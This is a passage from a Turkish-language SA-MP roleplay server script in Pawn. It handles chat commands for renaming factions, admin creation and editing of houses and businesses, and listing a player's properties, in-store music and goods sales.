			    Kullanim(playerid,"/birlikisim [faction id] [birlik adý]");
			    Bilgi(playerid, "Eðer birlik ID'den emin deðilseniz komutu kullanmayýn.");
			    return 1;
	   		}
  			if(strfind( resultxfd , "|" , true ) == -1)
    		{
    		    if(strlen(resultxfd) > 32 || strlen(resultxfd) < 3)
    		    {
					Hata(playerid, "Birlik adýný en az 3, en fazla 32 karakter yapabilirsiniz.");
					return 1;
				}
    		    new yazi[256];
   			   	strmid(Birlik[id][fisim],resultxfd,0,strlen(resultxfd),32);
    		    format(yazi,sizeof(yazi),"%d numaralý birliðin adýný %s olarak deðiþtirdiniz.",id,resultxfd);
    		    Bilgi(playerid, yazi);
    		    BirlikKaydet(id);
    		    return 1;
			}
			else
			{
				Hata(playerid, "Hatalý bir karakter girdiniz.");
			}
   		}
		else
		{
		    Hata(playerid, "Birlik bulunamadý.");
		    return 1;
		}
	}
	//___________________EV KOMUTLARI__________________________________________//

	if(strcmp(string, "/evsil", true) == 0 || strcmp(string, "/esil", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 6 && AKontrol(playerid))
	    {
	        new id;
	        foreach(new mesafe : Houses)
	        {
		        if(PlayerToPoint(2.0, playerid, Ev[mesafe][girisX], Ev[mesafe][girisY], Ev[mesafe][girisZ]))
		        {
		            if(GetPlayerVirtualWorld(playerid) == Ev[mesafe][egirisvw])
		            {
		                id = mesafe;
		                break;
					}
				}
			}
			if(id == 0)
			{
			    Hata(playerid, "Yakýnýnýzda herhangi bir ev yok.");
			    return 1;
			}
			else
			{
			    EvSil(id);
		        return 1;
			}
		}
		return 1;
	}
	if(strcmp(string, "/evekle", true) == 0 || strcmp(string, "/eekle") == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
	    {
			new Float:Poslar[3];
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
			    SendClientMessage(playerid, BIZIMYESIL, "____________________EV EKLEME MENÜSÜ____________________");
				SendClientMessage(playerid, COLOR_GREY, "/evekle [islem]");
				SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: exterior, interior, tamamla");
			   	SendClientMessage(playerid, BIZIMYESIL, "____________________________________________________________");
				return 1;
			}
			else if(strcmp(string, "exterior", true) == 0)
			{
			    GetPlayerPos(playerid, Poslar[0], Poslar[1], Poslar[2]);
			    SetPVarFloat(playerid, "exteriorX", Poslar[0]);
			    SetPVarFloat(playerid, "exteriorY", Poslar[1]);
			    SetPVarFloat(playerid, "exteriorZ", Poslar[2]);
			    SetPVarInt(playerid, "extdurum", 1);
			    SetPVarInt(playerid, "egirisint", GetPlayerInterior(playerid));
			    SetPVarInt(playerid, "egirisvw", GetPlayerVirtualWorld(playerid));
			    Bilgi(playerid, "Ev exteriorunu baþarýlý bir þekilde ayarladýnýz. Interior iþlemi için: '/evekle interior'");
			}
			else if(strcmp(string, "interior", true) == 0)
			{
			    GetPlayerPos(playerid, Poslar[0], Poslar[1], Poslar[2]);
			    SetPVarFloat(playerid, "einteriorX", Poslar[0]);
			    SetPVarFloat(playerid, "einteriorY", Poslar[1]);
			    SetPVarFloat(playerid, "einteriorZ", Poslar[2]);
			    SetPVarInt(playerid, "ecikisint", GetPlayerInterior(playerid));
			    SetPVarInt(playerid, "intdurum", 1);
			    Bilgi(playerid, "Ev interiorunu baþarýlý bir þekilde ayarladýnýz. Evi eklemek için: '/evekle tamamla'");
			}
			else if(strcmp(string, "tamamla", true) == 0)
			{
			    	if(GetPVarInt(playerid, "extdurum") != 1 || GetPVarInt(playerid, "intdurum") != 1)
			        	return Hata(playerid, "Evin interiorunu yada exteriorunu belirlemediðiniz için ev yaratýlamaz.");
					new query[1024];
					GetPlayerPos(playerid, Poslar[0], Poslar[1], Poslar[2]);
					format(query, sizeof(query), "INSERT INTO `evler` (`girisx`, `girisy`, `girisz`) VALUES ('%f', '%f', '%f')", Poslar[0], Poslar[1], Poslar[2]);
					new Cache:cache = mysql_query(query,true);
					new ev = cache_insert_id();
					cache_delete(cache);
					Ev[ev][eid] = ev;
					Ev[ev][girisX] = GetPVarFloat(playerid, "exteriorX");
					Ev[ev][girisY] = GetPVarFloat(playerid, "exteriorY");
	    			Ev[ev][girisZ] = GetPVarFloat(playerid, "exteriorZ");
				    Ev[ev][cikisX] = GetPVarFloat(playerid, "einteriorX");
				    Ev[ev][cikisY] = GetPVarFloat(playerid, "einteriorY");
				    Ev[ev][cikisZ] = GetPVarFloat(playerid, "einteriorZ");
				    Ev[ev][egirisint] = GetPVarInt(playerid, "egirisint");
				    Ev[ev][ecikisint] = GetPVarInt(playerid, "ecikisint");
				    Ev[ev][egirisvw] = GetPVarInt(playerid, "egirisvw");
				    Ev[ev][ekilit] = 1;
				    Ev[ev][kiralayan] = -1;
				    Ev[ev][kirafiyat] = 0;
				    Ev[ev][kira] = 0;
				    Ev[ev][efiyat] = 75000;
				    Ev[ev][esahip] = -1;
				    Ev[ev][ecikisvw] = ev+333;
					Iter_Add(Houses, ev);
					SetPlayerPos(playerid, Ev[ev][girisX], Ev[ev][girisY], Ev[ev][girisZ]);
					SetPlayerInteriorEx(playerid, Ev[ev][egirisint]);
					SetPlayerVirtualWorld(playerid, Ev[ev][egirisvw]);
					format(string, sizeof(string), "Ev baþarýyla eklendi. ID: %d. düzenlemek için: '/evduzenle'", ev);
					Bilgi(playerid, string);
				    EvKaydet(ev);
				    EvAyarla(ev);
			}
		}
		else
		{
		    Hata(playerid, "Yönetim ekibi üyesi deðilsiniz.");
		}
		return 1;
	}
	if(strcmp(string, "/evduzenle", true) == 0 || strcmp(string, "/eduzenle") == 0)
	{
	    if(EvMesafesi(2.0, playerid) != 0 && Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
	    {
	        new yakindaki = EvMesafesi(2.0, playerid);
	        ShowEDuzenle(playerid, yakindaki);
		}
		else
		{
		    Hata(playerid, "Bu komutu kullanabilmek için evin yakýnýnda olmalýsýnýz.");
		}
		return 1;
	}
	if(strcmp(string, "/isyerlerim", true) == 0 || strcmp(string, "/isyerim", true) == 0 || strcmp(string, "/dukkanim", true) == 0 || strcmp(string, "/dukkanlarim", true) == 0)
	{
	    if(!Isyerlerim(playerid))
	    {
	        Hata(playerid, "Adýnýza kayýtlý hiç iþyeri bulunamadý.");
	        return 1;
		}
		format(string, sizeof(string), ""C7"| Ýþyerlerim  "C8"(%d Adet) "C7"|", Isyerlerim(playerid));
		SendClientMessage(playerid, COLOR_GREEN, string);
		new __adres[64],  _kitext[12], mstring[256];
		_kitext = "Hayýr";
		foreach(new i : Business)
		{
		    format(__adres, sizeof(__adres), "%s %d", GetLocation(Isyeri[i][girisX],Isyeri[i][girisY],Isyeri[i][girisZ]), i);
			if(Isyeri[i][ikilit] == 1) _kitext = "Evet";
		    if(Isyeri[i][isahip] == Karakter[playerid][sqlid]) {
				if(Isyeri[i][ortak] != -1 && Isyeri[i][kiralayan] != -1) format(mstring, sizeof(mstring), "|Sahip| Ad: %s, Adres: %s, Sahip: %s, Vergi: %d$, Kilit: %s, Ortak: %s, Kiracý: %s, Kira Fiyatý: $%d", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ivergi], _kitext, SQLFromName(Isyeri[i][ortak]), SQLFromName(Isyeri[i][kiralayan]), Isyeri[i][kirafiyat]), SendClientMessage(playerid, -1, mstring);
                else if(Isyeri[i][ortak] != -1) format(mstring, sizeof(mstring), "|Sahip| Ad: %s, Adres: %s, Sahip: %s, Deðer: %d$, Vergi: %d$, Kilit: %s, Ortak: %s", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ifiyat], Isyeri[i][ivergi],_kitext, SQLFromName(Isyeri[i][ortak])), SendClientMessage(playerid, -1, mstring);
				else if(Isyeri[i][kiralayan] != -1) format(mstring, sizeof(mstring), "|Sahip| Ad: %s, Adres: %s, Sahip: %s, Deðer: %d$, Vergi: %d$, Kilit: %s, Kiracý: %s, Kira Fiyatý: $%d", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ifiyat], Isyeri[i][ivergi],_kitext, SQLFromName(Isyeri[i][kiralayan]), Isyeri[i][kirafiyat]), SendClientMessage(playerid, -1, mstring);
				else format(mstring, sizeof(mstring), "|Sahip| Ad: %s, Adres: %s, Sahip: %s, Deðer: %d$, Vergi: %d$, Kilit: %s", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ifiyat], Isyeri[i][ivergi],_kitext), SendClientMessage(playerid, -1, mstring);
			}
			if(Isyeri[i][ortak] == Karakter[playerid][sqlid]) {
				if(Isyeri[i][ortak] != -1 && Isyeri[i][kiralayan] != -1) format(mstring, sizeof(mstring), "|Ortak| Ad: %s, Adres: %s, Sahip: %s, Vergi: %d$, Kilit: %s, Ortak: %s, Kiracý: %s, Kira Fiyatý: $%d", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ivergi],_kitext, SQLFromName(Isyeri[i][ortak]), SQLFromName(Isyeri[i][kiralayan]), Isyeri[i][kirafiyat]), SendClientMessage(playerid, -1, mstring);
                else if(Isyeri[i][ortak] != -1) format(mstring, sizeof(mstring), "|Ortak| Ad: %s, Adres: %s, Sahip: %s, Deðer: %d$, Vergi: %d$, Kilit: %s, Ortak: %s", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ifiyat], Isyeri[i][ivergi],_kitext, SQLFromName(Isyeri[i][ortak])), SendClientMessage(playerid, -1, mstring);
				else if(Isyeri[i][kiralayan] != -1) format(mstring, sizeof(mstring), "|Ortak| Ad: %s, Adres: %s, Sahip: %s, Deðer: %d$, Vergi: %d$, Kilit: %s, Kiracý: %s, Kira Fiyatý: $%d", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ifiyat], Isyeri[i][ivergi],_kitext, SQLFromName(Isyeri[i][kiralayan]), Isyeri[i][kirafiyat]), SendClientMessage(playerid, -1, mstring);
				else format(mstring, sizeof(mstring), "|Ortak| Ad: %s, Adres: %s, Sahip: %s, Deðer: %d$, Vergi: %d$, Kilit: %s", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ifiyat], Isyeri[i][ivergi],_kitext), SendClientMessage(playerid, -1, mstring);
			}
			if(Isyeri[i][kiralayan] == Karakter[playerid][sqlid] && Isyeri[i][kira] == 1) {
				if(Isyeri[i][ortak] != -1 && Isyeri[i][kiralayan] != -1) format(mstring, sizeof(mstring), "|Kira| Ad: %s, Adres: %s, Sahip: %s, Vergi: %d$, Kilit: %s, Ortak: %s, Kiracý: %s, Kira Fiyatý: $%d", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ivergi],_kitext, SQLFromName(Isyeri[i][ortak]), SQLFromName(Isyeri[i][kiralayan]), Isyeri[i][kirafiyat]), SendClientMessage(playerid, -1, mstring);
                else if(Isyeri[i][ortak] != -1) format(mstring, sizeof(mstring), "|Kira| Ad: %s, Adres: %s, Sahip: %s, Deðer: %d$, Vergi: %d$, Kilit: %s, Ortak: %s", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ifiyat], Isyeri[i][ivergi],_kitext, SQLFromName(Isyeri[i][ortak])), SendClientMessage(playerid, -1, mstring);
				else if(Isyeri[i][kiralayan] != -1) format(mstring, sizeof(mstring), "|Kira| Ad: %s, Adres: %s, Sahip: %s, Deðer: %d$, Vergi: %d$, Kilit: %s, Kiracý: %s, Kira Fiyatý: $%d", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ifiyat], Isyeri[i][ivergi],_kitext, SQLFromName(Isyeri[i][kiralayan]), Isyeri[i][kirafiyat]), SendClientMessage(playerid, -1, mstring);
				else format(mstring, sizeof(mstring), "|Kira| Ad: %s, Adres: %s, Sahip: %s, Deðer: %d$, Vergi: %d$, Kilit: %s", Isyeri[i][iad], __adres, SQLFromName(Isyeri[i][isahip]), Isyeri[i][ifiyat], Isyeri[i][ivergi],_kitext), SendClientMessage(playerid, -1, mstring);
			}
		}
		return 1;
	}
	if(strcmp(string, "/evlerim", true) == 0 || strcmp(string, "/evim", true) == 0 || strcmp(string, "/mulklerim", true) == 0)
	{
	    if(!Evlerim(playerid))
	    {
	        Hata(playerid, "Adýnýza kayýtlý hiç ev bulunamadý.");
	        return 1;
		}
		format(string, sizeof(string), ""C7"| Evlerim  "C8"(%d Adet)"C7" |", Evlerim(playerid));
		SendClientMessage(playerid, COLOR_GREEN, string);
		new __adres[64], _kitext[12], _ktext2[32], mstring[256];
		_kitext = "Hayýr";
		_ktext2 = "Yok";
		foreach(new i : Houses)
		{
		    if(Ev[i][esahip] == Karakter[playerid][sqlid] && Ev[i][egirisvw] == 0)
			{
                format(__adres, sizeof(__adres), "%s %d", GetLocation(Ev[i][girisX],Ev[i][girisY],Ev[i][girisZ]), i);
				if(Ev[i][ekilit] == 1) _kitext = "Evet";
				if(Ev[i][kiralayan] != -1) format(_ktext2, sizeof(_ktext2), "%s", SQLFromName(Ev[i][kiralayan]));
				if(Ev[i][kira] == 1) format(mstring, sizeof(mstring), "|Sahip| Adres: %s, Sahip: %s, Deðer: %d$, Kilit: %s, Kiracý: %s, Kira Fiyatý: %d$", __adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext, _ktext2, Ev[i][kirafiyat]);
				else format(mstring, sizeof(mstring), "|Sahip| Adres: %s, Sahip: %s, Deðer: %d$, Kilit: %s", __adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext);
				SendClientMessage(playerid, -1, mstring);
			}
			else if(Ev[i][kiralayan] == Karakter[playerid][sqlid] && Ev[i][kira] == 1 && Ev[i][egirisvw] == 0)
			{
			    format(__adres, sizeof(__adres), "%s %d", GetLocation(Ev[i][girisX],Ev[i][girisY],Ev[i][girisZ]), i);
				if(Ev[i][ekilit] == 1) _kitext = "Evet";
				if(Ev[i][kiralayan] != -1) format(_ktext2, sizeof(_ktext2), "%s", SQLFromName(Ev[i][kiralayan]));
		 		if(Ev[i][kira] == 1) format(mstring, sizeof(mstring), "|Kira| Adres: %s, Sahip: %s, Deðer: %d$, Kilit: %s, Kiracý: %s, Kira Fiyatý: %d$", __adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext, _ktext2, Ev[i][kirafiyat]);
				else format(mstring, sizeof(mstring), "|Kira| Adres: %s, Sahip: %s, Deðer: %d$, Kilit: %s", __adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext);
			 	SendClientMessage(playerid, -1, mstring);
			}
			else if(EvAnahtarKontrol(playerid, i) && Ev[i][egirisvw] == 0)
			{
			    format(__adres, sizeof(__adres), "%s %d", GetLocation(Ev[i][girisX],Ev[i][girisY],Ev[i][girisZ]), i);
				if(Ev[i][ekilit] == 1) _kitext = "Evet";
				if(Ev[i][kiralayan] != -1) format(_ktext2, sizeof(_ktext2), "%s", SQLFromName(Ev[i][kiralayan]));
				if(Ev[i][kira] == 1) format(mstring, sizeof(mstring), "|Anahtar| Adres: %s, Sahip: %s, Deðer: %d$, Kilit: %s, Kiracý: %s, Kira Fiyatý: %d$", __adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext, _ktext2, Ev[i][kirafiyat]);
				else format(mstring, sizeof(mstring), "|Anahtar| Adres: %s, Sahip: %s, Deðer: %d$, Kilit: %s", __adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext);
				SendClientMessage(playerid, -1, mstring);
			}
			else if(Ev[i][esahip] == Karakter[playerid][sqlid] && Ev[i][egirisvw] != 0)
			{
                format(__adres, sizeof(__adres), "%s %d", GetLocation(Ev[i][girisX],Ev[i][girisY],Ev[i][girisZ]), i);
				if(Ev[i][ekilit] == 1)
				if(Ev[i][kiralayan] != -1) format(_ktext2, sizeof(_ktext2), "%s", SQLFromName(Ev[i][kiralayan]));
				if(Ev[i][kira] == 1) format(mstring, sizeof(mstring), "|Sahip| Daire: %s - %s,, Sahip: %s, Deðer: %d$, Kilit: %s, Kiracý: %s, Kira Fiyatý: %d$", __adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext, _ktext2, Ev[i][kirafiyat]);
				else format(mstring, sizeof(mstring), "|Sahip| Daire: %s - %s, Sahip: %s, Deðer: %d$, Kilit: %s", Ev[i][ekonum],__adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext);
				SendClientMessage(playerid, -1, mstring);
			}
			else if(Ev[i][kiralayan] == Karakter[playerid][sqlid] && Ev[i][kira] == 1 && Ev[i][egirisvw] != 0)
			{
			    format(__adres, sizeof(__adres), "%s %d", GetLocation(Ev[i][girisX],Ev[i][girisY],Ev[i][girisZ]), i);
				if(Ev[i][ekilit] == 1) _kitext = "Evet";
				if(Ev[i][kiralayan] != -1) format(_ktext2, sizeof(_ktext2), "%s", SQLFromName(Ev[i][kiralayan]));
		 		if(Ev[i][kira] == 1) format(mstring, sizeof(mstring), "|Kira| Daire: %s - %s,, Sahip: %s, Deðer: %d$, Kilit: %s, Kiracý: %s, Kira Fiyatý: %d$", __adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext, _ktext2, Ev[i][kirafiyat]);
				else format(mstring, sizeof(mstring), "|Kira| Daire: %s - %s, Sahip: %s, Deðer: %d$, Kilit: %s", Ev[i][ekonum],__adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext);
			 	SendClientMessage(playerid, -1, mstring);
			}
			else if(EvAnahtarKontrol(playerid, i) && Ev[i][egirisvw] != 0)
			{
			    format(__adres, sizeof(__adres), "%s %d", GetLocation(Ev[i][girisX],Ev[i][girisY],Ev[i][girisZ]), i);
				if(Ev[i][ekilit] == 1) _kitext = "Evet";
				if(Ev[i][kiralayan] != -1) format(_ktext2, sizeof(_ktext2), "%s", SQLFromName(Ev[i][kiralayan]));
				if(Ev[i][kira] == 1) format(mstring, sizeof(mstring), "|Anahtar| Daire: %s - %s,, Sahip: %s, Deðer: %d$, Kilit: %s, Kiracý: %s, Kira Fiyatý: %d$", __adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext, _ktext2, Ev[i][kirafiyat]);
				else format(mstring, sizeof(mstring), "|Anahtar| Daire: %s - %s, Sahip: %s, Deðer: %d$, Kilit: %s", Ev[i][ekonum],__adres, SQLFromName(Ev[i][esahip]), Ev[i][efiyat],_kitext);
				SendClientMessage(playerid, -1, mstring);
			}
		}
		return 1;
	}
	//___________________ÝÞYERÝ KOMUTLARI______________________________________
	if(!strcmp("/imuzik", string, true))
	{
		foreach(new i : Business)
		{
			if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw] && GetPlayerInterior(playerid) == Isyeri[i][icikisint] && (Isyeri[i][isahip] == Karakter[playerid][sqlid] || Isyeri[i][ortak] == Karakter[playerid][sqlid] || Isyeri[i][kiralayan] == Karakter[playerid][sqlid]))
			{
			    new Float:x, Float:y, Float:z;
			    GetPlayerPos(playerid, x, y, z);
			    if(isnull(Isyeri[i][imuzik]))
			    {
					string = strtok(cmdtext, idx);
					if(isnull(string)) Kullanim(playerid, "/imuzik [url]");
					else
					{
					    strmid(Isyeri[i][imuzik], string, 0, strlen(string), 128);
					    for(new id = 0; id < MAX_PLAYERS; id++)
						{
							if(PlayerToPoint(40.0, id, x, y, z))
							{
								PlayAudioStreamForPlayer(id, string, x, y, z, 40.0, 1);
							}
						}
					}
				}
				else
				{
				    for(new id = 0; id < MAX_PLAYERS; id++)
					{
						if(PlayerToPoint(60.0, id, x, y, z))
						{
						    strdel(Isyeri[i][imuzik], 0, 128);
							StopAudioStreamForPlayer(id);
						}
					}

				}
				break;
			}
		}
	    return 1;
	}
	if(!strcmp(string, "/malsat", true))
	{
	    string = strtok(cmdtext, idx);
	    if(!strlen(string))
		{
	 		Kullanim(playerid, "/malsat [fonksiyon]");
	 		SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: yiyecek, icecek, benzin");
	 		return 1;
		}
		else if(!strcmp(string, "yiyecek", true))
		{
		    if(Birlik[Karakter[playerid][birlik]][ftip] != NAKLIYE) return Hata(playerid, "Nakliye þirketinde çalýþmýyorsunuz.");
		    string = strtok(cmdtext, idx);
		    if(!strlen(string))
		    {
		 		Kullanim(playerid, "/malsat yiyecek [oyuncuID] [miktar] [fiyat]");
		        return 1;
		    }
			new giveplayerid = strval(string);
		    if(ProxDetectorS(3.5, playerid, giveplayerid) && playerid != giveplayerid)
		    {
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
			 		Kullanim(playerid, "/malsat yiyecek [oyuncuID] [miktar] [fiyat]");
			        return 1;
		        }
				new miktar = strval(string);
				if(miktar > 0)
				{
					if(Karakter[playerid][nyiyeceq]-miktar >= 0)
					{
					    string = strtok(cmdtext, idx);
					    if(!strlen(string))
					    {
					 		Kullanim(playerid, "/malsat yiyecek [oyuncuID] [miktar] [fiyat]");
					        return 1;
					    }
					    new fiyat = strval(string);
					    if(fiyat > 0)
					    {
							format(string, sizeof(string), "%s adlý oyuncuya %d$ fiyatýndan yiyecek satýþý fiyatýný gönderdiniz.", OyuncuAdiniBul(giveplayerid), fiyat);
							Bilgi(playerid, string);
							format(string, sizeof(string), "%s adlý oyuncudan %d$ fiyatýndan yiyecek satýþý teklifi aldýnýz.", OyuncuAdiniBul(playerid), fiyat);
							Bilgi(giveplayerid, string);
							format(string, sizeof(string), "%s tarafýndan bir satýþ teklifi aldýnýz.\nTürü: Yiyecek/Dondurulmuþ Ürün\nFiyat: %d$\nAdet fiyatý: %d$", OyuncuAdiniBul(playerid), fiyat, Veriler[yiyecekfiyat]);
							ShowPlayerDialog(giveplayerid, 3030, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ürün Satýþý", string, "Onayla", "Reddet");
							MalSatYTeklif[giveplayerid] = playerid;
						    MalSatYMiktar[giveplayerid] = miktar;
							MalSatYFiyat[giveplayerid] = fiyat;
						}
						else Hata(playerid, "Geçersiz bir miktar girdiniz.");
					}
					else Hata(playerid, "Üzerinizde bu miktarda ürün bulunmamakta.");
				}
				else Hata(playerid, "Geçersiz bir miktar girdiniz.");
			}
		}
		return 1;
	}
	if(!strcmp(string, "/urunlerim"))
	{
	    format(string, sizeof(string), "[YÝYECEK ÜRÜN MÝKTARI] Üzerinizde þu anda %d adet ürün taþýyorsunuz.", Karakter[playerid][nyiyeceq]);
	    Bilgi(playerid, string);
	    format(string, sizeof(string), "[ÝÇECEK/ALKOL ÜRÜN MÝKTARI] Üzerinizde þu anda %d adet ürün taþýyorsunuz.", Karakter[playerid][nicqi]);
	    Bilgi(playerid, string);
	    format(string, sizeof(string), "[BENZÝN MÝKTARI] Toplam %d lt. benzine sahipsiniz.", Karakter[playerid][nbenzin]);
	    Bilgi(playerid, string);
	    return 1;
	}
	if(strcmp(string, "/iduzenle", true) == 0 || strcmp(string, "/isyeriduzenle") == 0)
	{
	    if(IsyeriMesafesi(2.0,playerid) != 0 && Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
	    {
	        new yakindaki = IsyeriMesafesi(2.0,playerid);
			if(yakindaki == 0) yakindaki = IsyeriIceridenMesafesi(20.0,playerid);
	        ShowIDuzenle(playerid, yakindaki);
		}
		else
		{
		    Hata(playerid, "Bu komutu yalnýzca iþyerinin yakýnýnda kullanabilirsiniz.");
		}
		return 1;
	}
	if(strcmp(string, "/icikisvw", true) == 0)
	{
	    new yakindaki;
	    if((yakindaki = IsyeriMesafesi(2.0,playerid)) != 0 && Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
	    {
	        string = strtok(cmdtext, idx);
			if(isnull(string)) return 1;
			Isyeri[yakindaki][icikisvw] = strval(string);
			format(string, sizeof(string), "%d idli iþyerinin çýkýþ vw idsi %d olarak deðiþtirildi.", yakindaki, strval(string));
			Bilgi(playerid, string);
		}
		else
		{
		    Hata(playerid, "Bu komutu yalnýzca iþyerinin yakýnýnda kullanabilirsiniz.");
		}
		return 1;
	}
	if(strcmp(string, "/iekle", true) == 0 || strcmp(string, "/isyeriekle") == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
	    {
			new Float:Poslar[3];
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
			    SendClientMessage(playerid, BIZIMYESIL, "____________________ÝÞYERÝ EKLEME MENÜSÜ____________________");
				SendClientMessage(playerid, COLOR_GREY, "/i(syeri)ekle [islem]");
				SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: exterior, interior, tamamla");
			   	SendClientMessage(playerid, BIZIMYESIL, "____________________________________________________________");
			   	return 1;
			}
			else if(strcmp(string, "exterior", true) == 0)
			{
			    GetPlayerPos(playerid, Poslar[0], Poslar[1], Poslar[2]);
			    SetPVarFloat(playerid, "iexteriorX", Poslar[0]);
			    SetPVarFloat(playerid, "iexteriorY", Poslar[1]);
			    SetPVarFloat(playerid, "iexteriorZ", Poslar[2]);
			    SetPVarInt(playerid, "exteriordurum", 1);
			    SetPVarInt(playerid, "girisint", GetPlayerInterior(playerid));
			    SetPVarInt(playerid, "girisvw", GetPlayerVirtualWorld(playerid));
			    Bilgi(playerid, "Ýþyeri exteriorunu baþarýlý bir þekilde ayarladýnýz. Interior iþlemi için: '/i(syeri)ekle interior'");
			}
			else if(strcmp(string, "interior", true) == 0)
			{
			    GetPlayerPos(playerid, Poslar[0], Poslar[1], Poslar[2]);
			    SetPVarFloat(playerid, "iinteriorX", Poslar[0]);
			    SetPVarFloat(playerid, "iinteriorY", Poslar[1]);
			    SetPVarFloat(playerid, "iinteriorZ", Poslar[2]);
			    SetPVarInt(playerid, "icikisint", GetPlayerInterior(playerid));
			    SetPVarInt(playerid, "interiordurum", 1);
			    Bilgi(playerid, "Ýþyeri interiorunu baþarýlý bir þekilde ayarladýnýz. Ýþyerini eklemek için: '/i(syeri)ekle tamamla'");
			}
			else if(strcmp(string, "tamamla", true) == 0)
			{
			    	if(GetPVarInt(playerid, "exteriordurum") != 1 || GetPVarInt(playerid, "interiordurum") != 1)
			        	return Hata(playerid, "Ýþyerinin interiorunu yada exteriorunu belirlemediðiniz için iþyeri yaratýlamaz.");
					new query[1024];
					new mahmutbelediye[128] = "Bos Dukkan";
					GetPlayerPos(playerid, Poslar[0], Poslar[1], Poslar[2]);
					format(query, sizeof(query), "INSERT INTO `isyerleri` (`girisx`, `girisy`, `girisz`) VALUES('%f', '%f', '%f')", Poslar[0], Poslar[1], Poslar[2]);
					new Cache:cache = mysql_query(query,true);
					new i = cache_insert_id();
					cache_delete(cache);
				 	Isyeri[i][iid] = i;
				    Isyeri[i][girisX] = GetPVarFloat(playerid, "iexteriorX");
				    Isyeri[i][girisY] = GetPVarFloat(playerid, "iexteriorY");
				    Isyeri[i][girisZ] = GetPVarFloat(playerid, "iexteriorZ");
				    Isyeri[i][cikisX] = GetPVarFloat(playerid, "iinteriorX");
				    Isyeri[i][cikisY] = GetPVarFloat(playerid, "iinteriorY");
				    Isyeri[i][cikisZ] = GetPVarFloat(playerid, "iinteriorZ");
				    Isyeri[i][igirisint] = GetPVarInt(playerid, "girisint");
				    Isyeri[i][icikisint] = GetPVarInt(playerid, "icikisint");
				    Isyeri[i][ikilit] = 1;
				    Isyeri[i][yedekanahtar] = -1;
				    Isyeri[i][ifiyat] = 75000;
				    Isyeri[i][isahip] = -1;
				    Isyeri[i][icikisvw] = i+333;
				    Isyeri[i][kira] = 0;
				    Isyeri[i][kiralayan] = -1;
				    Isyeri[i][kirafiyat] = 0;
				    Isyeri[i][itip] = 0;
				    Isyeri[i][istok] = 0;
				    Isyeri[i][iad] = mahmutbelediye;
					Isyeri[i][ipickupid] = CreateDynamicPickup(1239, 1, Isyeri[i][girisX], Isyeri[i][girisY], Isyeri[i][girisZ]);
					for(new ix=0;ix<10;ix++)
					{
					    Isyeri[i][isci][ix] = -1;
					}
					Isyeri[i][ortak] = -1;
					Iter_Add(Business, i);
					IsyeriKaydet(i);
					DeletePVar(playerid, "iexteriorX");
					DeletePVar(playerid, "iexteriorY");
					DeletePVar(playerid, "iexteriorZ");
					DeletePVar(playerid, "exteriordurum");
					DeletePVar(playerid, "girisint");
					DeletePVar(playerid, "girisvw");
					DeletePVar(playerid, "iinteriorX");
					DeletePVar(playerid, "iinteriorY");
					DeletePVar(playerid, "iinteriorZ");
					DeletePVar(playerid, "icikisint");
					DeletePVar(playerid, "icikisvw");
					DeletePVar(playerid, "interiordurum");
					SetPlayerPos(playerid, Isyeri[i][girisX], Isyeri[i][girisY], Isyeri[i][girisZ]);
					SetPlayerInteriorEx(playerid, Isyeri[i][igirisint]);
					SetPlayerVirtualWorld(playerid, Isyeri[i][igirisvw]);
					format(string, sizeof(string), "Ýþyeri baþarýyla eklendi. ID: %d. düzenlemek için: '/i(syeri)duzenle'", i);
					Bilgi(playerid, string);
					IsyeriAyarla(i);
			}
			return 1;
		}
		else
		{
		    Hata(playerid, "Yönetim ekibi üyesi deðilsiniz.");
		}
		return 1;
	}
	if(strcmp(string, "/isil", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 6 && AKontrol(playerid))
	    {
	        new id;
	        foreach(new mesafe : Business)
	        {
		        if(PlayerToPoint(2.0, playerid, Isyeri[mesafe][girisX], Isyeri[mesafe][girisY], Isyeri[mesafe][girisZ]))
		        {
		            if(GetPlayerVirtualWorld(playerid) == Isyeri[mesafe][igirisvw])
		            {
		                id = mesafe;
		                break;
					}
				}
			}
			if(id == 0)
			{
